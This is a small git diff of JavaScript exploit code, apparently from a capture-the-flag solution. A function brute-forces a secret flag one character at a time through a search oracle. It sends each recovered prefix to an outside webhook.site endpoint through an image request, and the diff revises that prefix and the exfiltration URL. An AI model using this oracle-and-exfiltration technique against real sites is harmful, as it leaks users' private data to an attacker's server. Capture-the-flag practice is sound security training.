@@ -27,12 +27,12 @@
 
     async function exploit() {
         let str = "0123456789abcdef}";
-        let FLAG = "DH{";
+        let FLAG = "DH{22d1445ad68";
         while(!FLAG.includes("}")) {
             for(let ch of str) {
                 if(await search(FLAG+ch)) {
                     FLAG += ch;
-                    img.src = `https://webhook.site/702d7c95-84b7-4c4b-804f-ed34ff6520c5/${FLAG}`;
+                    img.src = `https://webhook.site/702d7c95-84b7-4c4b-804f-ed34ff6520c5?flag=${FLAG}`;
                     break;
                 }
             }
